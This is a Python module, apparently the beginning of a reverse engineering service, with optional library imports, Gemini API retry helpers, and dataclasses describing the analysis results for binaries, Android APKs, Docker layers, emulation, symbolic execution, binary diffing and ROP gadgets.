"""
Reverse Engineering Service for VRAgent.

Provides analysis capabilities for:
- Binary files (EXE, ELF, DLL, SO)
- Android APK files
- Docker image layers
"""

import os
import re
import json
import struct
import tempfile
import shutil
import zipfile
import subprocess
import math
import asyncio
import logging
import base64
import binascii
import string
import uuid
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple, Set
from dataclasses import dataclass, field, asdict
from defusedxml import ElementTree  # Use defusedxml to prevent XXE attacks

from backend.core.logging import get_logger
from backend.core.config import settings

logger = get_logger(__name__)

# Suppress Androguard's extremely verbose DEBUG logging (uses loguru)
# This dramatically improves performance by avoiding thousands of log entries
try:
    from loguru import logger as loguru_logger
    loguru_logger.disable("androguard")
    loguru_logger.disable("androguard.core")
    loguru_logger.disable("androguard.core.axml")
    loguru_logger.disable("androguard.core.apk")
    loguru_logger.disable("androguard.core.analysis")
    loguru_logger.disable("androguard.core.dex")
except ImportError:
    pass

# Also suppress standard logging just in case
logging.getLogger('androguard').setLevel(logging.ERROR)
logging.getLogger('androguard.core').setLevel(logging.ERROR)

# Try to import pefile for better PE analysis
try:
    import pefile
    PEFILE_AVAILABLE = True
except ImportError:
    PEFILE_AVAILABLE = False
    logger.warning("pefile not installed - using basic PE parsing")

# Try to import LIEF for binary parsing fallback
try:
    import lief
    LIEF_AVAILABLE = True
except ImportError:
    LIEF_AVAILABLE = False
    logger.warning("lief not installed - LIEF parsing not available")

# Try to import pyelftools for comprehensive ELF analysis
try:
    from elftools.elf.elffile import ELFFile
    from elftools.elf.sections import SymbolTableSection
    from elftools.elf.dynamic import DynamicSection
    from elftools.elf.relocation import RelocationSection
    from elftools.elf.gnuversions import GNUVerDefSection, GNUVerNeedSection
    from elftools.dwarf.dwarfinfo import DWARFInfo
    PYELFTOOLS_AVAILABLE = True
except ImportError:
    PYELFTOOLS_AVAILABLE = False
    logger.warning("pyelftools not installed - using basic ELF parsing")

# Try to import Capstone for disassembly
try:
    import capstone
    from capstone import Cs, CS_ARCH_X86, CS_ARCH_ARM, CS_ARCH_ARM64, CS_ARCH_MIPS
    from capstone import CS_MODE_32, CS_MODE_64, CS_MODE_ARM, CS_MODE_THUMB, CS_MODE_MIPS32, CS_MODE_MIPS64
    CAPSTONE_AVAILABLE = True
    
    # Extended architecture support (capstone 5.0+)
    try:
        from capstone import CS_ARCH_RISCV, CS_MODE_RISCV32, CS_MODE_RISCV64
    except ImportError:
        CS_ARCH_RISCV = None
        CS_MODE_RISCV32 = None
        CS_MODE_RISCV64 = None
    
    try:
        from capstone import CS_ARCH_PPC
    except ImportError:
        CS_ARCH_PPC = None
    
    try:
        from capstone import CS_ARCH_SPARC
    except ImportError:
        CS_ARCH_SPARC = None
    
    try:
        from capstone import CS_ARCH_M68K
    except ImportError:
        CS_ARCH_M68K = None
    
    try:
        from capstone import CS_ARCH_BPF, CS_MODE_BPF
    except ImportError:
        CS_ARCH_BPF = None
        CS_MODE_BPF = None

except ImportError:
    CAPSTONE_AVAILABLE = False
    CS_ARCH_RISCV = CS_MODE_RISCV32 = CS_MODE_RISCV64 = None
    CS_ARCH_PPC = CS_ARCH_SPARC = CS_ARCH_M68K = None
    CS_ARCH_BPF = CS_MODE_BPF = None
    logger.warning("capstone not installed - disassembly not available")

# Try to import androguard for APK analysis
try:
    from androguard.core.apk import APK
    from androguard.core.axml import AXMLPrinter
    ANDROGUARD_AVAILABLE = True
except ImportError:
    ANDROGUARD_AVAILABLE = False
    logger.warning("androguard not installed - using basic APK parsing")

# Try to import YARA for signature matching
try:
    import yara
    YARA_AVAILABLE = True
except ImportError:
    YARA_AVAILABLE = False
    logger.warning("yara-python not installed - YARA scanning disabled")

# Try to import fuzzy hashing libraries
try:
    import ssdeep
    SSDEEP_AVAILABLE = True
except ImportError:
    SSDEEP_AVAILABLE = False
    logger.warning("ssdeep not installed - fuzzy hashing disabled")

try:
    import tlsh
    TLSH_AVAILABLE = True
except ImportError:
    TLSH_AVAILABLE = False
    logger.warning("tlsh not installed - TLSH hashing disabled")

# Try to import Unicorn for CPU emulation (lightweight code snippet emulation)
try:
    from unicorn import Uc, UC_ARCH_X86, UC_ARCH_ARM, UC_ARCH_ARM64, UC_ARCH_MIPS
    from unicorn import UC_MODE_32, UC_MODE_64, UC_MODE_ARM, UC_MODE_THUMB, UC_MODE_MIPS32
    from unicorn.x86_const import (
        UC_X86_REG_EAX, UC_X86_REG_EBX, UC_X86_REG_ECX, UC_X86_REG_EDX,
        UC_X86_REG_ESI, UC_X86_REG_EDI, UC_X86_REG_EBP, UC_X86_REG_ESP, UC_X86_REG_EIP,
        UC_X86_REG_RAX, UC_X86_REG_RBX, UC_X86_REG_RCX, UC_X86_REG_RDX,
        UC_X86_REG_RSI, UC_X86_REG_RDI, UC_X86_REG_RBP, UC_X86_REG_RSP, UC_X86_REG_RIP,
        UC_X86_REG_R8, UC_X86_REG_R9, UC_X86_REG_R10, UC_X86_REG_R11,
        UC_X86_REG_R12, UC_X86_REG_R13, UC_X86_REG_R14, UC_X86_REG_R15,
        UC_X86_REG_EFLAGS, UC_X86_REG_CS, UC_X86_REG_DS, UC_X86_REG_ES,
        UC_X86_REG_FS, UC_X86_REG_GS, UC_X86_REG_SS,
    )
    UNICORN_AVAILABLE = True
except ImportError:
    UNICORN_AVAILABLE = False
    logger.warning("unicorn not installed - CPU emulation not available")

# Try to import angr for symbolic execution
try:
    import angr
    import claripy
    ANGR_AVAILABLE = True
except (ImportError, AttributeError, Exception) as e:
    ANGR_AVAILABLE = False
    logger.warning(f"angr not available - symbolic execution disabled: {e}")

# Try to import ropper for ROP gadget finding
try:
    from ropper import RopperService
    ROPPER_AVAILABLE = True
except ImportError:
    ROPPER_AVAILABLE = False
    logger.warning("ropper not installed - ROP gadget finding not available")


# ============================================================================
# Async Retry Helper for Gemini API Calls
# ============================================================================

async def gemini_request_with_retry(
    request_func,
    max_retries: int = 3,
    base_delay: float = 2.0,
    timeout_seconds: float = 180.0,
    operation_name: str = "Gemini API call"
):
    """
    Execute a Gemini API request with retry logic and timeout handling.
    
    Args:
        request_func: Async function that makes the API call
        max_retries: Maximum number of retry attempts
        base_delay: Base delay in seconds (doubles each retry)
        timeout_seconds: Request timeout in seconds
        operation_name: Name for logging purposes
    
    Returns:
        API response or None if all retries failed
    """
    last_error = None
    
    for attempt in range(max_retries):
        try:
            # Wrap request in timeout
            response = await asyncio.wait_for(
                request_func(),
                timeout=timeout_seconds
            )
            return response
            
        except asyncio.TimeoutError:
            last_error = f"Request timed out after {timeout_seconds}s"
            logger.warning(f"{operation_name}: Timeout (attempt {attempt + 1}/{max_retries})")
            
        except Exception as e:
            last_error = str(e)
            error_lower = last_error.lower()
            
            # Check if error is retryable
            retryable_errors = [
                'disconnected', 'timeout', 'connection', 'unavailable',
                '503', '429', '500', '502', '504', 'reset', 'broken pipe',
                'temporary', 'overloaded', 'capacity', 'rate limit'
            ]
            
            is_retryable = any(err in error_lower for err in retryable_errors)
            
            if not is_retryable:
                logger.error(f"{operation_name}: Non-retryable error: {e}")
                raise  # Don't retry non-transient errors
            
            logger.warning(f"{operation_name}: Retryable error (attempt {attempt + 1}/{max_retries}): {e}")
        
        # Calculate backoff delay with jitter
        if attempt < max_retries - 1:
            delay = base_delay * (2 ** attempt) + (asyncio.get_event_loop().time() % 1)
            logger.info(f"{operation_name}: Retrying in {delay:.1f}s...")
            await asyncio.sleep(delay)
    
    logger.error(f"{operation_name}: All {max_retries} attempts failed. Last error: {last_error}")
    return None


def sync_gemini_request_with_retry(
    request_func,
    max_retries: int = 3,
    base_delay: float = 2.0,
    timeout_seconds: float = 180.0,
    operation_name: str = "Gemini API call"
):
    """
    Execute a synchronous Gemini API request with retry logic.
    
    For sync functions that can't use asyncio.wait_for for timeout,
    we rely on the SDK's internal timeout handling.
    """
    import time
    import random
    last_error = None
    
    for attempt in range(max_retries):
        try:
            response = request_func()
            return response
            
        except Exception as e:
            last_error = str(e)
            error_lower = last_error.lower()
            
            # Check if error is retryable
            retryable_errors = [
                'disconnected', 'timeout', 'connection', 'unavailable',
                '503', '429', '500', '502', '504', 'reset', 'broken pipe',
                'temporary', 'overloaded', 'capacity', 'rate limit'
            ]
            
            is_retryable = any(err in error_lower for err in retryable_errors)
            
            if not is_retryable:
                logger.error(f"{operation_name}: Non-retryable error: {e}")
                raise
            
            logger.warning(f"{operation_name}: Retryable error (attempt {attempt + 1}/{max_retries}): {e}")
        
        # Calculate backoff delay with jitter
        if attempt < max_retries - 1:
            delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
            logger.info(f"{operation_name}: Retrying in {delay:.1f}s...")
            time.sleep(delay)
    
    logger.error(f"{operation_name}: All {max_retries} attempts failed. Last error: {last_error}")
    return None


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class ExtractedString:
    """A string extracted from a binary."""
    value: str
    offset: int
    encoding: str  # "ascii" or "utf16"
    category: Optional[str] = None  # "url", "email", "path", "api_key", etc.
    confidence: float = 1.0


@dataclass
class ImportedFunction:
    """An imported function from a binary."""
    name: str
    library: str
    ordinal: Optional[int] = None
    is_suspicious: bool = False
    reason: Optional[str] = None


@dataclass
class RichHeaderEntry:
    """An entry in the PE Rich header."""
    product_id: int
    build_id: int
    count: int
    product_name: Optional[str] = None
    vs_version: Optional[str] = None


@dataclass
class RichHeader:
    """PE Rich header information."""
    entries: List[RichHeaderEntry]
    rich_hash: str  # MD5 hash of Rich header for malware identification
    checksum: int
    raw_data: str  # Hex representation
    clear_data: str  # Decrypted hex representation


@dataclass
class BinaryMetadata:
    """Metadata extracted from a binary file."""
    file_type: str
    architecture: str
    file_size: int
    entry_point: Optional[int] = None
    is_packed: bool = False
    packer_name: Optional[str] = None
    compile_time: Optional[str] = None
    sections: List[Dict[str, Any]] = field(default_factory=list)
    headers: Dict[str, Any] = field(default_factory=dict)
    # PE-specific fields
    rich_header: Optional[RichHeader] = None
    imphash: Optional[str] = None
    tls_callbacks: List[int] = field(default_factory=list)
    mitigations: Dict[str, Any] = field(default_factory=dict)
    resource_summary: Dict[str, Any] = field(default_factory=dict)
    version_info: Dict[str, Any] = field(default_factory=dict)
    authenticode: Optional[Dict[str, Any]] = None
    overlay: Optional[Dict[str, Any]] = None
    pe_delay_imports: List[Dict[str, Any]] = field(default_factory=list)
    pe_relocations: Dict[str, Any] = field(default_factory=dict)
    pe_debug: Dict[str, Any] = field(default_factory=dict)
    pe_data_directories: List[Dict[str, Any]] = field(default_factory=list)
    pe_manifest: Optional[str] = None
    # ELF-specific fields
    interpreter: Optional[str] = None
    linked_libraries: List[str] = field(default_factory=list)
    relro: Optional[str] = None  # "Full", "Partial", "None"
    stack_canary: bool = False
    nx_enabled: bool = False
    pie_enabled: bool = False
    elf_dynamic: Dict[str, Any] = field(default_factory=dict)
    elf_relocations: Dict[str, Any] = field(default_factory=dict)
    elf_version_info: Dict[str, Any] = field(default_factory=dict)
    elf_build_id: Optional[str] = None
    elf_program_headers: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class ELFSymbol:
    """A symbol from an ELF binary."""
    name: str
    address: int
    size: int
    symbol_type: str  # "FUNC", "OBJECT", "NOTYPE", etc.
    binding: str  # "LOCAL", "GLOBAL", "WEAK"
    section: str
    is_imported: bool = False
    is_exported: bool = False
    is_suspicious: bool = False
    reason: Optional[str] = None


@dataclass
class DisassemblyInstruction:
    """A disassembled instruction with enhanced metadata."""
    address: int
    mnemonic: str
    op_str: str
    bytes_hex: str
    size: int
    is_call: bool = False
    is_jump: bool = False
    is_conditional_jump: bool = False
    is_return: bool = False
    is_suspicious: bool = False
    comment: Optional[str] = None
    # Enhanced fields for better analysis
    target_address: Optional[int] = None  # Branch/call target if resolvable
    reads_regs: List[str] = field(default_factory=list)  # Registers read
    writes_regs: List[str] = field(default_factory=list)  # Registers written
    memory_refs: List[str] = field(default_factory=list)  # Memory references
    string_ref: Optional[str] = None  # Referenced string if any
    xrefs_from: List[int] = field(default_factory=list)  # Addresses that reference this
    xrefs_to: List[int] = field(default_factory=list)  # Addresses this references


@dataclass
class BasicBlock:
    """A basic block in the control flow graph."""
    start_address: int
    end_address: int
    instructions: List[DisassemblyInstruction]
    predecessors: List[int] = field(default_factory=list)  # Start addresses of predecessor blocks
    successors: List[int] = field(default_factory=list)  # Start addresses of successor blocks
    is_entry: bool = False
    is_exit: bool = False
    block_type: str = "normal"  # normal, call_block, loop_header, switch_case


@dataclass
class ControlFlowGraph:
    """Control flow graph for a function."""
    blocks: Dict[int, BasicBlock] = field(default_factory=dict)  # address -> block
    entry_block: Optional[int] = None
    exit_blocks: List[int] = field(default_factory=list)
    loop_headers: List[int] = field(default_factory=list)
    complexity: int = 0  # Cyclomatic complexity


@dataclass
class CrossReference:
    """Cross-reference between addresses."""
    from_address: int
    to_address: int
    xref_type: str  # call, jump, data_read, data_write
    from_function: Optional[str] = None
    to_function: Optional[str] = None


@dataclass
class DisassemblyFunction:
    """Disassembly of a function with CFG."""
    name: str
    address: int
    size: int
    instructions: List[DisassemblyInstruction]
    calls: List[str]  # Functions called
    suspicious_patterns: List[str]
    # Enhanced fields
    cfg: Optional[ControlFlowGraph] = None
    local_vars: List[str] = field(default_factory=list)  # Detected stack variables
    arguments: List[str] = field(default_factory=list)  # Detected arguments
    calling_convention: Optional[str] = None
    cyclomatic_complexity: int = 1
    is_leaf: bool = True  # True if function makes no calls
    is_recursive: bool = False
    stack_frame_size: Optional[int] = None


@dataclass
class DisassemblyResult:
    """Complete disassembly result with enhanced analysis."""
    entry_point_disasm: List[DisassemblyInstruction]
    functions: List[DisassemblyFunction]
    suspicious_instructions: List[Dict[str, Any]]
    architecture: str
    mode: str
    # Enhanced fields
    cross_references: List[CrossReference] = field(default_factory=list)
    string_references: Dict[int, str] = field(default_factory=dict)  # address -> string
    import_references: Dict[int, str] = field(default_factory=dict)  # address -> import name
    total_instructions: int = 0
    coverage_percent: float = 0.0  # Percentage of .text section disassembled


# ============================================================================
# Data Flow Analysis Types
# ============================================================================

@dataclass
class TaintSource:
    """A source of tainted (untrusted) data."""
    address: int
    source_type: str  # "user_input", "network", "file", "environment", "argv"
    register_or_memory: str  # Which register or memory location is tainted
    function_name: Optional[str] = None
    description: str = ""


@dataclass
class TaintSink:
    """A dangerous sink where tainted data should not reach."""
    address: int
    sink_type: str  # "exec", "sql", "file_write", "format_string", "memcpy"
    function_name: str
    cwe_id: str = ""
    description: str = ""


@dataclass
class TaintedValue:
    """A value that is tainted (derived from untrusted input)."""
    location: str  # Register name or memory address
    source: TaintSource
    transformations: List[str] = field(default_factory=list)  # Operations applied
    confidence: float = 1.0  # How confident we are it's still tainted


@dataclass
class DataFlowPath:
    """A path from a taint source to a sink."""
    source: TaintSource
    sink: TaintSink
    path: List[int]  # Addresses along the path
    instructions: List[str]  # Instruction summaries along path
    is_exploitable: bool = False
    sanitizers_found: List[str] = field(default_factory=list)
    confidence: float = 0.0
    vulnerability_type: Optional[str] = None
    cwe_id: Optional[str] = None


@dataclass 
class DataFlowAnalysisResult:
    """Complete data flow analysis result."""
    taint_sources: List[TaintSource]
    taint_sinks: List[TaintSink]
    data_flow_paths: List[DataFlowPath]
    vulnerable_paths: List[DataFlowPath]
    total_paths_analyzed: int = 0
    analysis_coverage: float = 0.0


# ============================================================================
# Type Recovery Types
# ============================================================================

@dataclass
class RecoveredField:
    """A recovered struct/class field."""
    offset: int
    size: int
    inferred_type: str  # "int", "ptr", "char[]", "float", "unknown"
    access_pattern: str  # "read", "write", "read_write"
    name: Optional[str] = None  # Recovered or generated name


@dataclass
class RecoveredStruct:
    """A recovered structure/class type."""
    address: int  # Where it's allocated or referenced
    total_size: int
    fields: List[RecoveredField]
    inferred_name: Optional[str] = None
    confidence: float = 0.0
    usage_count: int = 0  # How many times this struct pattern appears


@dataclass
class RecoveredArgument:
    """A recovered function argument."""
    index: int
    register_or_stack: str  # "rdi", "rsi", "[rbp+0x10]", etc.
    inferred_type: str
    inferred_name: Optional[str] = None
    is_pointer: bool = False
    points_to: Optional[str] = None  # What the pointer points to


@dataclass
class RecoveredLocalVar:
    """A recovered local variable."""
    stack_offset: int
    size: int
    inferred_type: str
    scope_start: int  # First instruction that uses it
    scope_end: int  # Last instruction that uses it
    inferred_name: Optional[str] = None


@dataclass
class RecoveredFunctionSignature:
    """Recovered function signature with types."""
    address: int
    name: str
    return_type: str
    arguments: List[RecoveredArgument]
    local_vars: List[RecoveredLocalVar]
    calling_convention: str
    is_variadic: bool = False
    confidence: float = 0.0


@dataclass
class TypeRecoveryResult:
    """Complete type recovery result."""
    functions: List[RecoveredFunctionSignature]
    structs: List[RecoveredStruct]
    global_vars: List[Dict[str, Any]]
    vtables: List[Dict[str, Any]]  # Virtual function tables (C++)
    total_types_recovered: int = 0


# ============================================================================
# Emulation Types
# ============================================================================

@dataclass
class EmulationMemoryAccess:
    """A memory access during emulation."""
    address: int
    access_type: str  # "read", "write", "execute"
    size: int
    value: Optional[int] = None
    instruction_address: int = 0


@dataclass
class EmulationSyscall:
    """A system call during emulation."""
    address: int
    syscall_number: int
    syscall_name: str
    arguments: List[int]
    return_value: Optional[int] = None


@dataclass
class EmulationApiCall:
    """An API/library call during emulation."""
    address: int
    function_name: str
    arguments: List[Any]
    return_value: Optional[Any] = None
    library: Optional[str] = None


@dataclass
class EmulationState:
    """CPU state at a point in emulation."""
    address: int
    registers: Dict[str, int]
    flags: Dict[str, bool]
    stack_top: List[int]  # Top N values on stack
    instruction_count: int = 0


@dataclass
class DecodedString:
    """A string decoded during emulation."""
    address: int
    decoded_value: str
    encoding: str  # "ascii", "utf-16", "xor", "base64"
    decoding_method: str  # How it was decoded
    original_bytes: bytes = b""


@dataclass
class EmulationTrace:
    """A trace of emulation execution."""
    start_address: int
    end_address: int
    instructions_executed: int
    states: List[EmulationState]
    memory_accesses: List[EmulationMemoryAccess]
    syscalls: List[EmulationSyscall]
    api_calls: List[EmulationApiCall]
    decoded_strings: List[DecodedString]
    loops_detected: List[Dict[str, Any]]
    suspicious_behaviors: List[str]
    error: Optional[str] = None


@dataclass
class EmulationResult:
    """Complete emulation analysis result."""
    traces: List[EmulationTrace]
    decoded_strings: List[DecodedString]
    api_calls: List[EmulationApiCall]
    syscalls: List[EmulationSyscall]
    self_modifying_code: List[Dict[str, Any]]
    unpacked_code: Optional[bytes] = None
    shellcode_detected: bool = False
    anti_analysis_detected: List[str] = field(default_factory=list)
    total_instructions_emulated: int = 0
    emulation_coverage: float = 0.0


# ============================================================================
# Symbolic Execution Types
# ============================================================================

@dataclass
class SymbolicInput:
    """A symbolic input discovered during exploration."""
    name: str
    type: str  # 'stdin', 'argv', 'file', 'network', 'memory'
    size_bits: int
    constraints: List[str]  # String representation of constraints
    concrete_examples: List[str]  # Concrete values that satisfy constraints


@dataclass
class SymbolicPath:
    """A path discovered during symbolic execution."""
    path_id: int
    depth: int  # Number of branches taken
    constraints_count: int
    is_feasible: bool
    termination_reason: str  # 'reached_target', 'deadended', 'errored', 'timeout'
    addresses_visited: List[int]
    branches_taken: List[Tuple[int, bool]]  # (address, taken/not-taken)


@dataclass
class CrashInput:
    """Input that causes a crash."""
    input_type: str  # 'stdin', 'argv', 'file'
    input_value: bytes
    crash_address: int
    crash_type: str  # 'segfault', 'abort', 'div_by_zero', 'stack_overflow'
    vulnerability_type: str  # 'buffer_overflow', 'use_after_free', 'format_string'
    cwe_id: Optional[str] = None
    exploitability: str = "unknown"  # 'exploitable', 'probably_exploitable', 'not_exploitable'


@dataclass
class TargetReach:
    """Result of trying to reach a specific target address."""
    target_address: int
    target_name: Optional[str]
    reached: bool
    input_to_reach: Optional[bytes]
    path_length: int
    constraints_solved: int


@dataclass  
class SymbolicExecutionResult:
    """Complete symbolic execution analysis result."""
    paths_explored: int
    paths_deadended: int
    paths_errored: int
    max_depth_reached: int
    symbolic_inputs: List[SymbolicInput]
    crash_inputs: List[CrashInput]
    target_reaches: List[TargetReach]
    interesting_paths: List[SymbolicPath]
    vulnerabilities_found: List[Dict[str, Any]]
    execution_time_seconds: float
    memory_used_mb: float
    timeout_reached: bool = False
    error: Optional[str] = None


# ============================================================================
# Binary Diffing Types
# ============================================================================

@dataclass
class FunctionDiff:
    """Difference between two functions."""
    address_a: int
    address_b: Optional[int]  # None if function doesn't exist in B
    name: str
    match_type: str  # 'identical', 'modified', 'added', 'removed'
    similarity_score: float  # 0.0 - 1.0
    size_a: int
    size_b: Optional[int]
    instructions_changed: int
    blocks_changed: int
    calls_added: List[str]
    calls_removed: List[str]
    is_security_relevant: bool  # True if related to security functions
    diff_summary: Optional[str] = None


@dataclass
class BlockDiff:
    """Difference at basic block level."""
    address_a: int
    address_b: Optional[int]
    function_name: str
    match_type: str
    instructions_a: List[str]
    instructions_b: List[str]
    similarity: float


@dataclass
class StringDiff:
    """Difference in strings between binaries."""
    value: str
    status: str  # 'added', 'removed', 'unchanged'
    address_a: Optional[int]
    address_b: Optional[int]
    is_security_relevant: bool  # URLs, credentials, commands


@dataclass
class ImportDiff:
    """Difference in imports between binaries."""
    name: str
    library: str
    status: str  # 'added', 'removed', 'unchanged'
    is_security_relevant: bool


@dataclass
class BinaryDiffResult:
    """Complete binary diffing result."""
    file_a: str
    file_b: str
    architecture_a: str
    architecture_b: str
    functions_identical: int
    functions_modified: int
    functions_added: int
    functions_removed: int
    overall_similarity: float
    function_diffs: List[FunctionDiff]
    block_diffs: List[BlockDiff]  # Only for modified functions
    string_diffs: List[StringDiff]
    import_diffs: List[ImportDiff]
    security_relevant_changes: List[Dict[str, Any]]
    patch_analysis: Optional[str]  # AI-generated summary of patch
    is_same_binary: bool  # True if binaries are functionally identical
    error: Optional[str] = None


# ============================================================================
# ROP Gadget Types
# ============================================================================

@dataclass
class ROPGadget:
    """A single ROP gadget."""
    address: int
    instructions: List[str]  # e.g., ['pop rdi', 'ret']
    gadget_string: str  # Full string representation
    gadget_type: str  # 'pop', 'mov', 'xchg', 'syscall', 'jmp', 'call', 'arithmetic'
    size_bytes: int
    registers_controlled: List[str]
    is_useful: bool  # True if commonly useful in exploits
    quality_score: float  # 0.0-1.0, higher = cleaner gadget


@dataclass
class ROPChainTemplate:
    """A template for a common ROP chain."""
    name: str  # 'execve_shellcode', 'mprotect_rwx', 'write_primitive'
    description: str
    required_gadgets: List[str]
    available_gadgets: List[ROPGadget]
    is_buildable: bool  # True if all required gadgets are available
    chain_addresses: List[int]  # Addresses in order for the chain
    payload_template: Optional[str]  # Python code template to build payload


@dataclass
class ROPGadgetResult:
    """Complete ROP gadget analysis result."""
    total_gadgets: int
    unique_gadgets: int
    gadgets_by_type: Dict[str, int]
    gadgets: List[ROPGadget]
    useful_gadgets: List[ROPGadget]  # Filtered to most useful
    # Chain building support
    pop_gadgets: List[ROPGadget]  # For controlling registers
    syscall_gadgets: List[ROPGadget]  # syscall/int 0x80
    write_gadgets: List[ROPGadget]  # mov [reg], reg style
    pivot_gadgets: List[ROPGadget]  # Stack pivots
    chain_templates: List[ROPChainTemplate]
    # Security assessment
    nx_bypass_possible: bool
    execve_chain_buildable: bool
    mprotect_chain_buildable: bool
    rop_difficulty: str  # 'easy', 'medium', 'hard', 'very_hard'
    error: Optional[str] = None


@dataclass
class BinaryAnalysisResult:
    """Complete analysis result for a binary file."""
    filename: str
    metadata: BinaryMetadata
    strings: List[ExtractedString]
    imports: List[ImportedFunction]
    exports: List[str]
    secrets: List[Dict[str, Any]]
    suspicious_indicators: List[Dict[str, Any]]
    fuzzy_hashes: Dict[str, Optional[str]] = field(default_factory=dict)
    yara_matches: List[Dict[str, Any]] = field(default_factory=list)
    capa_summary: Optional[Dict[str, Any]] = None
    deobfuscated_strings: List[Dict[str, Any]] = field(default_factory=list)
    # Enhanced ELF fields
    symbols: List[ELFSymbol] = field(default_factory=list)
    disassembly: Optional[DisassemblyResult] = None
    dwarf_info: Optional[Dict[str, Any]] = None
    ai_analysis: Optional[str] = None
    ghidra_analysis: Optional[Dict[str, Any]] = None
    ghidra_ai_summaries: Optional[List[Dict[str, Any]]] = None
    # New advanced analysis fields
    data_flow_analysis: Optional[DataFlowAnalysisResult] = None
    type_recovery: Optional[TypeRecoveryResult] = None
    emulation_analysis: Optional[EmulationResult] = None
    # Symbolic execution, diffing, ROP analysis
    symbolic_execution: Optional[SymbolicExecutionResult] = None
    rop_gadgets: Optional[ROPGadgetResult] = None
    error: Optional[str] = None


@dataclass
class ApkCertificate:
    """APK signing certificate information."""
    subject: str
    issuer: str
    serial_number: str
    fingerprint_sha256: str
    fingerprint_sha1: str
    fingerprint_md5: str
    valid_from: str
    valid_until: str
    is_debug_cert: bool = False
    is_expired: bool = False
    is_self_signed: bool = False
    signature_version: str = "v1"  # v1, v2, v3
    public_key_algorithm: Optional[str] = None
    public_key_bits: Optional[int] = None


@dataclass
class ApkPermission:
    """An Android permission."""
    name: str
    is_dangerous: bool
    description: Optional[str] = None


@dataclass
class ApkComponent:
    """An Android app component."""
    name: str
    component_type: str  # "activity", "service", "receiver", "provider"
    is_exported: bool
    intent_filters: List[str] = field(default_factory=list)


@dataclass
class ApkAnalysisResult:
    """Complete analysis result for an APK file."""
    filename: str
    package_name: str
    version_name: Optional[str]
    version_code: Optional[int]
    min_sdk: Optional[int]
    target_sdk: Optional[int]
    permissions: List[ApkPermission]
    components: List[ApkComponent]
    strings: List[ExtractedString]
    secrets: List[Dict[str, Any]]
    urls: List[str]
    native_libraries: List[str]
    certificate: Optional[ApkCertificate] = None
    activities: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    receivers: List[str] = field(default_factory=list)
    providers: List[str] = field(default_factory=list)
    uses_features: List[str] = field(default_factory=list)
    app_name: Optional[str] = None
    debuggable: bool = False
    allow_backup: bool = True
    network_security_config: Optional[str] = None
    # New analysis fields
    dex_analysis: Optional[Dict[str, Any]] = None
    resource_analysis: Optional[Dict[str, Any]] = None
    intent_filter_analysis: Optional[Dict[str, Any]] = None
    network_config_analysis: Optional[Dict[str, Any]] = None
    smali_analysis: Optional[Dict[str, Any]] = None  # Smali/bytecode decompilation
    dynamic_analysis: Optional[Dict[str, Any]] = None  # Frida scripts for dynamic testing
    native_analysis: Optional[Dict[str, Any]] = None  # Native library (.so) analysis
    hardening_score: Optional[Dict[str, Any]] = None  # Security hardening score
    data_flow_analysis: Optional[Dict[str, Any]] = None  # Data flow/taint analysis
    security_issues: List[Dict[str, Any]] = field(default_factory=list)
    ai_analysis: Optional[str] = None
    # New structured AI reports
    ai_report_functionality: Optional[str] = None  # "What does this APK do" report
    ai_report_security: Optional[str] = None  # "Security Findings" report
    ai_report_architecture: Optional[str] = None  # Code architecture Mermaid diagram
    ai_report_attack_surface: Optional[str] = None  # Attack surface map
    # AI-Generated Mermaid Diagrams (with icons)
    ai_architecture_diagram: Optional[str] = None  # App architecture flowchart
    ai_data_flow_diagram: Optional[str] = None  # Data flow and privacy diagram
    error: Optional[str] = None


@dataclass
class SmaliMethodCode:
    """Decompiled Smali bytecode for a method."""
    class_name: str
    method_name: str
    method_signature: str
    access_flags: str
    return_type: str
    parameters: List[str]
    registers_count: int
    instructions: List[str]  # Smali bytecode instructions
    instruction_count: int
    has_try_catch: bool = False
    is_native: bool = False
    is_abstract: bool = False


@dataclass
class DexClassInfo:
    """Information about a class in DEX."""
    name: str
    access_flags: str
    superclass: Optional[str]
    interfaces: List[str]
    methods_count: int
    fields_count: int
    is_suspicious: bool = False
    suspicious_reasons: List[str] = field(default_factory=list)


@dataclass
class DexMethodInfo:
    """Information about a method in DEX."""
    class_name: str
    method_name: str
    access_flags: str
    return_type: str
    parameters: List[str]
    is_suspicious: bool = False
    suspicious_reason: Optional[str] = None


@dataclass
class ApkResourceInfo:
    """Information about APK resources."""
    string_resources: Dict[str, str]  # name -> value
    asset_files: List[str]
    raw_resources: List[str]
    drawable_count: int
    layout_count: int
    potential_secrets_in_resources: List[Dict[str, Any]]


@dataclass
class IntentFilterInfo:
    """Deep link and intent filter information."""
    component_name: str
    component_type: str
    actions: List[str]
    categories: List[str]
    data_schemes: List[str]
    data_hosts: List[str]
    data_paths: List[str]
    is_browsable: bool
    is_exported: bool
    deep_links: List[str]


@dataclass
class NetworkSecurityConfig:
    """Parsed network security configuration."""
    cleartext_permitted: bool
    cleartext_domains: List[str]
    trust_anchors: List[Dict[str, Any]]
    certificate_pins: List[Dict[str, Any]]
    domain_configs: List[Dict[str, Any]]
    security_issues: List[str]


@dataclass
class DockerLayerSecret:
    """A potential secret found in a Docker layer."""
    layer_id: str
    layer_command: str
    secret_type: str
    value: str
    masked_value: str
    context: str
    severity: str


@dataclass
class DockerLayerAnalysisResult:
    """Analysis result for Docker image layers."""
    image_name: str
    image_id: str
    total_layers: int
    total_size: int
    base_image: Optional[str]
    layers: List[Dict[str, Any]]
    secrets: List[DockerLayerSecret]
    deleted_files: List[Dict[str, Any]]
    security_issues: List[Dict[str, Any]]
    ai_analysis: Optional[str] = None
    error: Optional[str] = None


@dataclass
class FridaScript:
    """A generated Frida script for dynamic analysis."""
    name: str
    category: str  # ssl_bypass, root_bypass, crypto_hook, method_trace, etc.
    description: str
    script_code: str
    target_classes: List[str]
    target_methods: List[str]
    is_dangerous: bool = False  # Scripts that modify app behavior
    usage_instructions: str = ""


@dataclass
class DynamicAnalysisResult:
    """Dynamic analysis data including generated Frida scripts."""
    package_name: str
    frida_scripts: List[FridaScript]
    ssl_pinning_detected: bool
    root_detection_detected: bool
    crypto_methods: List[Dict[str, Any]]
    interesting_hooks: List[Dict[str, Any]]
    suggested_test_cases: List[str]
    frida_spawn_command: str
    frida_attach_command: str


@dataclass
class NativeFunction:
    """A function found in a native library."""
    name: str
    address: str
    size: int
    is_jni: bool = False
    is_exported: bool = False
    is_suspicious: bool = False
    suspicious_reason: Optional[str] = None


